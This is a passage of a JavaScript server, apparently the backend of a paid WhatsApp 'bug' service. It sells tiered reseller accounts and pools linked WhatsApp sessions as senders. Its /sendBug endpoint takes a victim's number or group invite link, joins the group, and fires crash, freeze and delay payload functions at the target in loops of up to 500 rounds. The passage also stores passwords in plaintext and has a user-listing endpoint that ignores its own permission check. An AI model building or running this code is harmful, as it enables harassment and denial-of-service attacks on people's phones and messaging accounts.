  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  const senderMode = req.query.senderMode || 'private';

  const groupRegex = /chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
  const isGroupLink = groupRegex.test(target || '');
  const isGroupJid = typeof target === 'string' && target.endsWith('@g.us');

  if (!isGroupLink && !isGroupJid) {
    target = (target || "").replace(/\D/g, "");
  }

  console.log(`[📤] target=${target} | bug=${bug} | mode=${senderMode}`);

  const keyInfo = activeKeys[key] || loadKeyList().find(k=>k.key===key||k.sessionKey===key);
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const roleCooldowns = { "member":250, "reseller":290, "vip":60, "admin":30, "partner":10, "moderator":10, "owner":1, "high owner":1, "tk":1, "ceo":1, "developer":1, "founder":1 };
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] ?? 60;

  if (!user.lastSend) user.lastSend = 0;
  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);

  if (diffSeconds < cooldownSeconds) {
    return res.json({
      valid: true, sended: false,
      cooldown: true, wait: cooldownSeconds - diffSeconds,
    });
  }

  user.lastSend = now;
  saveDatabase(db);

  res.json({ valid: true, sended: true, cooldown: false, role });

  setImmediate(async () => {
    saveUserLog(user.username, "bug",
      `Kirim Bug: ${bug.toUpperCase()}`,
      `Target: ${target} | Mode: ${senderMode} | Role: ${role}`
    );

    let sock = null;

    // ── Cek akses sender global ──────────────────────────────────────
    const allowedGlobalRoles = ['founder', 'developer', 'ceo', 'tk', 'high owner', 'owner', 'moderator', 'partner', 'admin', 'vip'];
    const isAllowedGlobal = allowedGlobalRoles.includes(user.role);

    if (senderMode === 'global' && isAllowedGlobal) {
      // Pool global = HANYA sender dari global_pool (dari member)
      const globalEntries = Object.entries(activeConnections).filter(
        ([name]) => connectionMeta[name] && connectionMeta[name].type === 'global'
      );
      if (globalEntries.length === 0) {
        console.warn(`[❌] Global: tidak ada global sender aktif (global_pool kosong).`);
        return;
      }
      sock = globalEntries[Math.floor(Math.random() * globalEntries.length)][1];
      console.log(`[🌍] Global sender dipilih. Role: ${user.role} | Total global pool: ${globalEntries.length}`);

    } else if (senderMode === 'global' && !isAllowedGlobal) {
      // Role member tidak boleh global → fallback ke private
      console.warn(`[⛔] Role '${user.role}' tidak diizinkan akses global. Fallback ke private.`);
      sock = await checkActiveSessionInFolder(user.username);
      if (!sock) {
        console.warn(`[❌] Private fallback: tidak ada sock untuk ${user.username}.`); return;
      }

    } else if (user.role === 'vip') {
      let pool = [];
      const vipPath = path.join(__dirname, 'vip');
      const userPath = path.join(__dirname, 'permenmd', user.username);
      if (fs.existsSync(vipPath)) pool.push(...getActiveSocketsFromPath(vipPath));
      if (fs.existsSync(userPath)) pool.push(...getActiveSocketsFromPath(userPath));
      if (pool.length === 0) {
        console.warn(`[❌] VIP: tidak ada sock.`); return;
      }
      sock = pool[Math.floor(Math.random() * pool.length)];
      console.log(`[👑] VIP pool. Total: ${pool.length}`);

    } else {
      sock = await checkActiveSessionInFolder(user.username);
      if (!sock) {
        console.warn(`[❌] Private: tidak ada sock untuk ${user.username}.`); return;
      }
      console.log(`[🔒] Private: ${user.username}`);
    }

    const attemptSend = async (sock, retry = false) => {
      let sessionName = null;
      try {
        for (const [k, v] of Object.entries(activeConnections)) {
          if (v === sock) { sessionName = k; break; }
        }

        let targetJid = "";

        if (isGroupLink) {
          const inviteCode = target.match(groupRegex)[1];
          console.log(`[🔗] Invite: ${inviteCode}`);
          let groupInfo;
          try { groupInfo = await sock.groupGetInviteInfo(inviteCode); }
          catch (e) { throw new Error("Invite group invalid / expired"); }
          targetJid = groupInfo.id;
          try {
            await sock.groupAcceptInvite(inviteCode);
            console.log(`[✅] Join group: ${targetJid}`);
          } catch { console.log(`[⚠️] Already joined`); }

        } else if (isGroupJid) {
          targetJid = target;
        } else {
          targetJid = target.replace(/\D/g, "") + "@s.whatsapp.net";
        }

        console.log(`[🎯] JID: ${targetJid}`);

        switch (bug) {
          case "fceh":
            for (let i = 0; i < 300; i++) {
             await SansV12(sock, targetJid);
             await elynn(sock, targetJid);
             await sleep(2000);
            }
            break;
          case "fcehjir":
            for (let i = 0; i < 200; i++) {
             await CrashHomeNew(sock, targetJid);
             await CrashMemek(sock, targetJid);
             await sleep(3000); 
            }
            break;
          case "lockchet":
            for (let i = 0; i < 300; i++) {
             await StuckHome(sock, targetJid);
             await blankClick(sock, targetJid);
             await sleep(2000); 
            }
            break;
          case "lockgbjir":
            for (let i = 0; i < 5; i++) {
             await BlankGroup(sock, targetJid);
             await groupbug(sock, targetJid);
            }
            break;
          case "delaydrain":
            for (let i = 0; i < 500; i++) {
             await ingpisible(sock, targetJid);
             await DelayInvisBapakLowh(sock, targetJid);
             await sleep(2000); 
            }
            break;
          case "crashhard":
            for (let i = 0; i < 200; i++) {
             await crash1(sock, targetJid);
             await crash2(sock, targetJid);
             await crash3(sock, targetJid);
             await crash4(sock, targetJid);
             await crash5(sock, targetJid);
             await sleep(2000); 
            }
            break;
          case "delayhard":
            for (let i = 0; i < 500; i++) {
             await DelayInvisbler(sock, targetJid);
             await sleep(2000); 
            }
            break;
          case "killandroid":
            for (let i = 0; i < 10; i++) {
             await lockMessages(sock, targetJid);
             await BlankNew(sock, targetJid);
             await sleep(100);
            }
            break;
          case "crashjir":
            for (let i = 0; i < 15; i++) {
             await lockMessages(sock,targetJid);
             await XFCUI(sock, targetJid);
             await BlankNew(sock, targetJid);
             await sleep(100);
            }
            break;
          case "crashui":
            for (let i = 0; i < 10; i++) {
             await lockMessages(sock, targetJid);
             await BlankNew(sock, targetJid);
             await sleep(100);
            }
            break;
          case "fcih":
            for (let i = 0; i < 5; i++) {
             await CrashKlikMaklo(sock, targetJid); 
             await FrezzChat(sock, targetJid);
             await sleep(100);
            }
            break;
          case "frezer":
            for (let i = 0; i < 30; i++) {
             await FrezeeChatnih(sock, targetJid);
             await BlankHardXbulldo(sock, targetJid);
             await sleep(1000);
            }
            break;
          case "fcios":
            for (let i = 0; i < 60; i++) {
             await ForcloseIos(sock, targetJid);
             await delayinvinvis(sock, targetJid);
             await sleep(1000);
            }
            break;
          case "fcehih":
            for (let i = 0; i < 50; i++) {
             await delay(sock, targetJid);
             await sleep(1000);
            }
            break;
          case "android_group":
            for (let i = 0; i < 100; i++) {
             await crashX(sock, targetJid);         
             await sleep(1000); 
            }
            break;
          case "lock_group":
            for (let i = 0; i < 200; i++) {
             await delayspam(sock, targetJid);
             await sleep(1000); 
            }
            break;
          case "roid_group":
            for (let i = 0; i < 200; i++) {
              await docthumb(sock, targetJid);
              await buggroupblank(sock, targetJid);
              await sleep(500);
            }
            break;
          case "freeje":
            for (let i = 0; i < 25; i++) {
            await BlankFreezeChatGroup(sock, targetJid);
            await sleep(1000);
            }
            break;
          case "freejegb":
            for (let i = 0; i < 25; i++) {
            await FrezeeXDelayGorup(sock, targetJid);
            await sleep(1000);
            }
            break;
          default:
            console.warn(`[⚠️] Bug '${bug}' tidak dikenal`);
        }

        console.log(`[✅] '${bug}' terkirim ke ${targetJid}`);
        return true;

      } catch (err) {
        console.warn(`[⚠️] ${err.message}`);
        if (sessionName && err.message === 'Connection Closed') {
          delete activeConnections[sessionName];
          console.log(`[🗑️] Session ${sessionName} dihapus`);
        }
        if (!retry) {
          const globalRolesRetry = ['founder', 'developer', 'ceo', 'tk', 'high owner', 'owner', 'moderator', 'partner', 'admin', 'vip'];
          if (globalRolesRetry.includes(user.role) && senderMode === 'global') {
            // Retry: hanya dari global_pool
            const globalEntries = Object.entries(activeConnections).filter(
              ([n]) => connectionMeta[n] && connectionMeta[n].type === 'global'
            );
            if (globalEntries.length > 0) {
              const retrySock = globalEntries[Math.floor(Math.random() * globalEntries.length)][1];
              console.log(`[🔄] Global retry: ${globalEntries.length} global sender tersedia`);
              return await attemptSend(retrySock, true);
            }
          } else if (user.role === 'vip') {
            let pool = [];
            const vipPath = path.join(__dirname, 'vip');
            const userPath = path.join(__dirname, 'permenmd', user.username);
            if (fs.existsSync(vipPath)) pool.push(...getActiveSocketsFromPath(vipPath));
            if (fs.existsSync(userPath)) pool.push(...getActiveSocketsFromPath(userPath));
            if (pool.length > 0) {
              return await attemptSend(pool[Math.floor(Math.random() * pool.length)], true);
            }
          } else {
            const retrySock = await checkActiveSessionInFolder(user.username);
            if (retrySock) return await attemptSend(retrySock, true);
          }
        }
        console.warn(`[❌] Gagal kirim '${bug}' ke ${target}`);
        return false;
      }
    };

    await attemptSend(sock);
  });
});

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);

  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      activeCreds.push({
        sessionName: sessionName
      });
    }
  }

  return activeCreds;
}

app.get("/getActiveSenders", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key] || loadKeyList().find(k=>k.key===key||k.sessionKey===key);
  if (!keyInfo) return res.json({ valid: false, senders: [] });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, senders: [] });

  // Hanya 6 role ini yang boleh lihat active senders
  const allowedRoles = ['founder', 'developer', 'ceo', 'tk', 'high owner', 'owner', 'moderator', 'partner', 'admin', 'vip'];
  if (!allowedRoles.includes(user.role)) {
    console.warn(`[⛔] Role '${user.role}' tidak diizinkan akses /getActiveSenders`);
    return res.json({ valid: false, message: 'Akses ditolak. Role tidak diizinkan.', senders: [] });
  }

  // Hanya tampilkan sender GLOBAL (dari global_pool / member)
  const globalSenders = Object.keys(activeConnections).filter(
    name => connectionMeta[name] && connectionMeta[name].type === 'global'
  );
  console.log(`[✅] ${user.username} (${user.role}) getActiveSenders: ${globalSenders.length} global sender`);
  res.json({ valid: true, role: user.role, senders: globalSenders });
});

app.get("/getSenderStats", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key] || loadKeyList().find(k=>k.key===key||k.sessionKey===key);
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const username = keyInfo.username;
  const baseDir = 'permenmd';
  let privateCount = 0;
  let globalCount = 0;

  try {
    const userPath = path.join(__dirname, baseDir, username);
    if (fs.existsSync(userPath)) {
      const files = fs.readdirSync(userPath).filter(f => f.endsWith(".json"));
      files.forEach(f => {
        const sessionName = path.basename(f, ".json");
        if (activeConnections[sessionName]) privateCount++;
      });
    }

    if (fs.existsSync(baseDir)) {
      const allUsers = fs.readdirSync(baseDir).filter(p => {
        const pPath = path.join(baseDir, p);
        return fs.lstatSync(pPath).isDirectory();
      });

      allUsers.forEach(u => {
        const uPath = path.join(baseDir, u);
        if (fs.existsSync(uPath)) {
          const files = fs.readdirSync(uPath).filter(f => f.endsWith(".json"));
          files.forEach(f => {
            const sessionName = path.basename(f, ".json");
            if (activeConnections[sessionName]) globalCount++;
          });
        }
      });
    }

    res.json({
      valid: true,
      private: privateCount,
      global: globalCount
    });
  } catch (err) {
    console.error("[STATS ERROR]", err.message);
    res.status(500).json({ valid: false, error: "Server Error" });
  }
});

app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key] || loadKeyList().find(k=>k.key===key||k.sessionKey===key);
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  let conns = [];
  const globalRoles  = ['founder', 'developer', 'ceo', 'tk', 'high owner', 'owner', 'moderator', 'partner', 'admin', 'vip'];
  const isGlobalRole = globalRoles.includes(user.role);
  const isVip        = user.role === 'vip';

  if (isGlobalRole) {
    // ── High Owner / Owner / High Admin / Admin / Reseller ─────────────────
    // Tampilkan: sender GLOBAL (dari global_pool) + sender PRIBADI sendiri
    console.log(`[${user.username}] Request mySender (Mode: ${user.role})`);

    // 1. Global sender — hanya yang type:'global' di connectionMeta
    const globalSenders = Object.keys(activeConnections).filter(
      name => connectionMeta[name] && connectionMeta[name].type === 'global'
    );
    globalSenders.forEach(name => {
      conns.push({ sessionName: name, source: 'global' });
    });

    // 2. Sender pribadi milik user ini saja
    const userPath = path.join(__dirname, 'permenmd', user.username);
    if (fs.existsSync(userPath)) {
      const userFiles = fs.readdirSync(userPath).filter(f => f.endsWith('.json'));
      userFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name] && !conns.find(c => c.sessionName === name)) {
          conns.push({ sessionName: name, source: 'private' });
        }
      });
    }
    console.log(`[✅] ${user.username} (${user.role}): ${conns.filter(c=>c.source==='global').length} global + ${conns.filter(c=>c.source==='private').length} private`);

  } else if (isVip) {
    // ── VIP: VIP Pool + Sender Pribadi ─────────────────────────────────────
    console.log(`[${user.username}] Request mySender (VIP Mode: VIP Pool + Personal)`);

    const vipPath = path.join(__dirname, 'vip');
    if (fs.existsSync(vipPath)) {
      const vipFiles = fs.readdirSync(vipPath).filter(f => f.endsWith('.json'));
      vipFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name]) {
          conns.push({ sessionName: name, source: 'vip' });
        }
      });
    }

    const userPath = path.join(__dirname, 'permenmd', user.username);
    if (fs.existsSync(userPath)) {
      const userFiles = fs.readdirSync(userPath).filter(f => f.endsWith('.json'));
      userFiles.forEach(f => {
        const name = path.basename(f, '.json');
        if (activeConnections[name] && !conns.find(c => c.sessionName === name)) {
          conns.push({ sessionName: name, source: 'personal' });
        }
      });
    }
    console.log(`[✅] VIP senders untuk ${user.username}: ${conns.length}`);

  } else {
    // ── Member: hanya sender pribadi ───────────────────────────────────────
    console.log(`[${user.username}] Request mySender (Private Mode)`);
    conns = getActiveCredsInFolder(user.username);
  }

  return res.json({
    valid: true,
    role: user.role,
    totalSenders: conns.length,
    connections: conns
  });
});

const connectVipSessions = async () => {
  const vipPath = path.join(__dirname, 'vip');
  if (!fs.existsSync(vipPath)) {
    console.log(`[👑] Folder vip/ tidak ditemukan, skip.`);
    return;
  }

  const sessions = fs.readdirSync(vipPath).filter(name =>
    fs.statSync(path.join(vipPath, name)).isDirectory()
  );

  console.log(`[👑] VIP sessions ditemukan: ${sessions.length}`);

  await Promise.all(
    sessions.map(sessionName => {
      if (activeConnections[sessionName]) {
        console.log(`[⏭️] VIP ${sessionName} sudah aktif, skip`);
        return Promise.resolve();
      }
      return connectSession(vipPath, sessionName);
    })
  );

  console.log(`[👑] Semua VIP session selesai diproses.`);
};

app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query
  const keyInfo = activeKeys[key]
  if (!keyInfo) return res.json({ valid: false })

  const db = loadDatabase()
  const user = db.find(u => u.username === keyInfo.username)
  if (!user) return res.status(401).json({ error: "Invalid session key" })
  if (!number) return res.status(400).json({ error: "Number is required" })

  try {
    // ── Tentukan folder berdasarkan role ────────────────────────────────────
    // member, admin, reseller → global_pool (sender langsung masuk global)
    // role lain (vip, high admin, owner, high owner) → folder pribadi
    const GLOBAL_POOL_DIR = 'global_pool';
    const isGlobalRole = ['member', 'vip', 'reseller'].includes(user.role);
    const targetOwner = isGlobalRole ? GLOBAL_POOL_DIR : user.username;
    // isMember tetap didefinisikan agar tidak merusak referensi di bawah
    const isMember = isGlobalRole;
    
    const baseDir = path.join("permenmd", targetOwner);
    const sessionDir = path.join(baseDir, number);

    if (isGlobalRole) {
      console.log(`[🌍 PAIRING] Role ${user.role} → simpan ke global_pool: ${number}`);
    } else {
      console.log(`[🔒 PAIRING] Role ${user.role} → simpan ke pribadi (${user.username}): ${number}`);
    }

    if (fs.existsSync(sessionDir)) {
      fs.rmSync(sessionDir, { recursive: true, force: true })
    }

    if (!fs.existsSync(baseDir)) {
      fs.mkdirSync(baseDir, { recursive: true })
    }

    fs.mkdirSync(sessionDir, { recursive: true })

    const { state, saveCreds } = await useMultiFileAuthState(sessionDir)
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
      keepAliveIntervalMs: 50000,
      logger: pino({ level: "silent" }),
      auth: state,
      syncFullHistory: true,
      markOnlineOnConnect: true,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 0,
      generateHighQualityLinkPreview: true,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      version
    })

    sock.ev.on("creds.update", saveCreds)

    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
      if (connection === "close") {
        const isLoggedOut =
          lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut
        if (!isLoggedOut) {
          await waiting(3000)
          // Reconnect ke folder yang sama (global_pool atau pribadi)
          await pairingWa(number, targetOwner)
        } else {
          delete activeConnections[number]
        }
      }
    })

    if (!sock.authState.creds.registered) {
      await waiting(1200)
      const code = await sock.requestPairingCode(number, "QUEENAPK")
      if (code) {
        return res.json({ 
          valid: true, 
          number, 
          pairingCode: code,
          senderType: isMember ? 'global' : 'private'
        })
      }
      return res.json({ valid: false })
    }

    return res.json({ valid: false })
  } catch (err) {
    return res.status(500).json({ error: err.message })
  }
})

app.get("/createAccount", async (req, res) => {
  const { key, newUser, pass, day, role: requestedRole } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' role '${requestedRole}' dengan key '${key}'`);

  const keyInfo = activeKeys[key] || loadKeyList().find(k=>k.key===key||k.sessionKey===key);
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username); 

  if (!creator) {
    console.log(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin.`);
    return res.json({valid:true,authorized:false,created:false,message:"Unauthorized creator role"});
  }

  const roleLimits = {
    founder: 999,
    developer: 999,
    ceo: 999,
    tk: 100,
    "high owner": 90,
    owner: 50,
    moderator: 45,
    partner: 40,
    admin: 35,
    vip: 30,
    reseller: 25,
    member: 20
  };

  const currentLimit = roleLimits[creator.role] || 0;
  const currentMonth = new Date().toISOString().slice(0, 7);

  if (!creator.usageLog || creator.usageLog.month !== currentMonth) {
    creator.usageLog = { count: 0, month: currentMonth };
  }

  if (creator.usageLog.count >= currentLimit) {
    console.log(`[❌ CREATE] Limit akun bulan ${creator.role} (${currentLimit}) telah tercapai.`);
    return res.json({
      valid: true,
      created: false,
      limitReached: true,
      message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.`
    });
  }

  // Hierarki role yang boleh dibuat oleh masing-masing creator
  const createHierarchy = {
    founder:  ['founder', 'developer', 'ceo', 'tk', 'high owner', 'owner', 'moderator', 'partner', 'admin', 'vip', 'reseller', 'member'],
    developer:  ['ceo', 'tk', 'high owner', 'owner', 'moderator', 'partner', 'admin', 'vip', 'reseller', 'member'],
    ceo:  ['tk', 'high owner', 'owner', 'moderator', 'partner', 'admin', 'vip', 'reseller', 'member'],
    tk:   ['high owner', 'owner', 'moderator', 'partner', 'admin', 'vip', 'reseller', 'member'],
    "high owner": ['owner', 'moderator', 'partner', 'admin', 'vip', 'reseller', 'member'],
    owner:      ['moderator', 'partner', 'admin', 'vip', 'reseller', 'member'],
    moderator:   ['partner', 'admin', 'vip', 'reseller', 'member'],
    partner: ['admin', 'vip', 'reseller', 'member'],
    admin:      ['vip', 'reseller', 'member'],
    reseller:   ['member'],
    member: []
  };

  const targetRole = requestedRole || 'member';
  const allowedRoles = createHierarchy[creator.role] || [];

  if (!allowedRoles.includes(targetRole)) {
    console.log(`[❌ CREATE] ${creator.role} tidak boleh membuat role ${targetRole}.`);
    return res.json({ valid: true, authorized: false, created: false, message: `Role ${creator.role} tidak bisa membuat akun dengan role ${targetRole}.` });
  }

  if (creator.role === "reseller" && parseInt(day) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: targetRole,
    parent: creator.username,
  };

  db.push(newAccount);
  creator.usageLog.count++;
  saveDatabase(db);

  saveUserLog(
    creator.username,
    "create",
    "Buat Akun Member",
    `User: ${newUser} | Durasi: ${day} Hari`
  );

  console.log(`[✅ CREATE] Akun berhasil dibuat: ${newAccount} (Sisa Kuota: ${currentLimit - creator.usageLog.count})`);
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  appendLogAsync('logUser.txt', logLine);

  // Kirim notifikasi Telegram — MARKDOWN
  const waktuCreate = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
  const sisaKuota = currentLimit - creator.usageLog.count;
  const notifText =
    `🔔 *Notifikasi Create Akun*\n\n` +
    `👤 *Creator:* ${creator.username}\n` +
    `✅ *User Baru:* ${newUser}\n` +
    `🎯 *Role:* ${targetRole || 'member'}\n` +
    `📅 *Durasi:* ${day} hari\n` +
    `⏳ *Expired:* ${newAccount.expiredDate}\n` +
    `📊 *Sisa Slot:* ${sisaKuota}\n\n` +
    `🕐 *Waktu:* ${waktuCreate}\n` +
    `━━━━━━━━━━━━━━━━━━━\n` +
    `🔹 *𝗤𝘂𝗲𝗻𝗻 𝗣𝗿𝗼𝗷𝗲𝗰𝘁*`;

  try {
    await sendTelegramNotif(notifText);
    console.log('[NOTIF CREATE ✅] Notif create terkirim');
  } catch (tgErr) {
    console.error('[NOTIF CREATE ❌] Gagal kirim notif:', tgErr.message);
  }

  return res.json({ valid: true, created: true, user: newAccount });
});

app.get("/deleteUser", async (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key] || loadKeyList().find(k=>k.key===key||k.sessionKey===key);
  if (!keyInfo) {
    console.log("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const deleter = db.find(u => u.username === keyInfo.username);
  const targetUser = db.find(u => u.username === username);

  if (!deleter || !targetUser) {
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  // Hanya high owner/owner yang bisa menghapus role owner/high owner
  if (['founder', 'developer', 'ceo',].includes(targetUser.role) && !['founder', 'developer', 'ceo'].includes(deleter.role)) {
    console.log(`[❌ DELETE] ${deleter.role} tidak boleh menghapus role founder,developer/ceo`);
    return res.json({ 
      valid: true, 
      authorized: false, 
      message: "Only founder,developer/ceo can delete another founder,developer/ceo account." 
    });
  }

  const roleLevel = {
    founder: 12,
    developer: 11,
    ceo: 10,
    tk: 9,
    "high owner": 8,
    owner: 7,
    moderator: 6,
    partner: 5,
    admin: 4,
    vip: 3,
    reseller: 2,
    member: 1
  };

  const deleterLevel = roleLevel[deleter.role] || 0;
  const targetLevel = roleLevel[targetUser.role] || 0;

  // Owner bisa hapus owner lain (level sama)
  if (deleterLevel < targetLevel) {
    console.log(`[❌ DELETE] ${deleter.role} (Lv ${deleterLevel}) tidak boleh menghapus ${targetUser.role} (Lv ${targetLevel}).`);
    return res.json({ valid: true, authorized: false, message: "You cannot delete a user with higher rank." });
  }

  const index = db.findIndex(u => u.username === username);
  if (index !== -1) {
    const deletedUser = db[index];
    db.splice(index, 1);
    saveDatabase(db);

    const logLine = `${deleter.username} Deleted ${username}\n`;
    appendLogAsync('logUser.txt', logLine);
    
    // Kirim notifikasi Telegram — MARKDOWN
    const waktuDelete = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
    const deletedRole = deletedUser.role || '-';
    const notifTextDel =
      `🔔 *NOTIFIKASI HAPUS AKUN*\n\n` +
      `👤 *Dihapus oleh:* ${deleter.username}\n` +
      `📛 *Username:* ${deletedUser.username}\n` +
      `🎯 *Role:* ${deletedRole}\n\n` +
      `🕐 *Waktu:* ${waktuDelete}\n` +
      `━━━━━━━━━━━━━━━━━━━\n` +
      `🔹 *Queen Project*`;

    try {
      await sendTelegramNotif(notifTextDel);
      console.log('[NOTIF DELETE ✅] Notif delete terkirim');
    } catch (tgErr) {
      console.error('[NOTIF DELETE ❌] Gagal kirim notif:', tgErr.message);
    }
    
    console.log("[✅ DELETE] User berhasil dihapus:", deletedUser);
    return res.json({ valid: true, deleted: true, user: deletedUser });
  }

  return res.json({ valid: true, deleted: false, message: "Failed to delete user." });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key] || loadKeyList().find(k=>k.key===key||k.sessionKey===key);
  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const requester = db.find(u => u.username === keyInfo.username);

  if (!requester || !['founder', 'developer', 'ceo', 'tk', 'high owner', 'owner'].includes(requester.role)) {
    console.log(`[❌ LIST] ${requester?.username || "Unknown"} tidak memiliki izin melihat list.`);
    
  }

  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
    parent: u.parent || "SYSTEM"
  }));

  return res.json({ valid: true, authorized: true, users });
});

app.get("/userAdd", async (req, res) => {
  const { key, username, password, role, day } = req.query;
  console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key] || loadKeyList().find(k=>k.key===key||k.sessionKey===key);
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username); 

  // HIERARKI ROLE BARU
  const hierarchy = {
    founder:  ['founder', 'developer', 'ceo', 'tk', 'high owner', 'owner', 'moderator', 'partner', 'admin', 'vip', 'reseller', 'member'],
    developer:  ['ceo', 'tk', 'high owner', 'owner', 'moderator', 'partner', 'admin', 'vip', 'reseller', 'member'],
    ceo:  ['tk', 'high owner', 'owner', 'moderator', 'partner', 'admin', 'vip', 'reseller', 'member'],
    tk:   ['high owner', 'owner', 'moderator', 'partner', 'admin', 'vip', 'reseller', 'member'],
    "high owner": ['owner', 'moderator', 'partner', 'admin', 'vip', 'reseller', 'member'],
    owner:      ['moderator', 'partner', 'admin', 'vip', 'reseller', 'member'],
    moderator:   ['partner', 'admin', 'vip', 'reseller', 'member'],
    partner: ['admin', 'vip', 'reseller', 'member'],
    admin:      ['vip', 'reseller', 'member'],
    reseller:   ['member'],
    member: []
  };

  const creatorRole = (creator.role || "member");
  const targetRole = (role || "member");

  if (!creator) {
    console.log("[❌ USERADD] Tidak diizinkan (Role salah/Unauthorized).");
    return res.json({valid:true,authorized:false,created:false,message:"Unauthorized creator role"});
  }

  // ✅ Tidak ada pengecekan khusus untuk owner - Owner bebas buat owner lain

  if (!hierarchy[creatorRole].includes(targetRole)) {
    console.log(`[❌ USERADD] ${creatorRole} tidak boleh membuat ${targetRole}.`);
    return res.json({ valid: true, authorized: false, message: `Role ${creatorRole} cannot create ${targetRole}.` });
  }

  const roleLimits = {
    founder: 999,
    developer: 999,
    ceo: 999,
    tk: 100,
    "high owner": 90,
    owner: 50,
    moderator: 45,
    partner: 40,
    admin: 35,
    vip: 30,
    reseller: 25,
    member: 20
  };

  const currentLimit = roleLimits[creatorRole] || 0;
  const currentMonth = new Date().toISOString().slice(0, 7);

  if (!creator.usageLog || creator.usageLog.month !== currentMonth) {
    creator.usageLog = { count: 0, month: currentMonth };
  }

  if (creator.usageLog.count >= currentLimit) {
    console.log(`[❌ USERADD] Limit akun bulan ${creatorRole} (${currentLimit}) telah tercapai.`);
    return res.json({
      valid: true,
      created: false,
      limitReached: true,
      message: `Limit pembuatan akun bulan ini (${currentLimit}) telah tercapai.`
    });
  }

  if (db.find(u => u.username === username)) {
    console.log("[❌ USERADD] Username sudah ada.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: targetRole,
    expiredDate: expired.toISOString().split("T")[0],
  };

  db.push(newUser);
  creator.usageLog.count++;
  saveDatabase(db);

  const logLine = `${creator.username} Created ${username} Role ${role} Days ${day}\n`;
  appendLogAsync('logUser.txt', logLine);
  const sisaKuotaUA = currentLimit - creator.usageLog.count;
  console.log(`[✅ USERADD] User berhasil dibuat: ${newUser} (Sisa Kuota: ${sisaKuotaUA})`);

  // === KIRIM NOTIF TELEGRAM ===
  const waktuUA = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
  const notifUA =
    `🔔 *NOTIFIKASI CREATE AKUN*\n\n` +
    `👤 *Creator:* ${creator.username}\n` +
    `✅ *User Baru:* ${username}\n` +
    `🎯 *Role:* ${targetRole || 'member'}\n` +
    `📅 *Durasi:* ${day} hari\n` +
    `⏳ *Expired:* ${expired.toISOString().split("T")[0]}\n` +
    `📊 *Sisa Slot:* ${sisaKuotaUA}\n\n` +
    `🕐 *Waktu:* ${waktuUA}\n` +
